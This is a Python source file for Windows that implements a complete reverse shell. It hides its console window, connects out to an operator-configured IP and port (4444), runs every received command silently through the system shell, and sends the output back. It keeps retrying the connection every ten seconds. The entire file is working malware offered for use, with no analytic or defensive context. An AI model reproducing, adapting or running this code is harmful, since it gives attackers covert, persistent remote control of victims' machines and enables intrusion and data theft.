import socket
import subprocess
import os
import sys
import time
import ctypes
import win32con
import win32gui
import win32process

# Hide console window
def hide_window():
    kernel32 = ctypes.WinDLL('kernel32')
    user32 = ctypes.WinDLL('user32')
    
    # Get current window handle
    hWnd = kernel32.GetConsoleWindow()
    
    # Hide window if console exists
    if hWnd:
        user32.ShowWindow(hWnd, win32con.SW_HIDE)

def reverse_shell():
    HOST = 'YOUR_IP_HERE'  # Change this to your IP
    PORT = 4444            # Change this to your port
    
    hide_window()  # Hide the window immediately
    
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((HOST, PORT))
            
            while True:
                # Receive command
                data = s.recv(1024).decode('utf-8').strip()
                if data.lower() in ('exit', 'quit'):
                    s.close()
                    sys.exit(0)
                
                # Execute command silently
                startupinfo = subprocess.STARTUPINFO()
                startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
                startupinfo.wShowWindow = subprocess.SW_HIDE
                
                proc = subprocess.Popen(data, 
                                      shell=True,
                                      stdout=subprocess.PIPE,
                                      stderr=subprocess.PIPE,
                                      stdin=subprocess.PIPE,
                                      startupinfo=startupinfo)
                
                stdout, stderr = proc.communicate()
                result = stdout + stderr
                s.send(result)
                
        except Exception:
            time.sleep(10)  # Wait before reconnecting
            continue

if __name__ == "__main__":
    reverse_shell()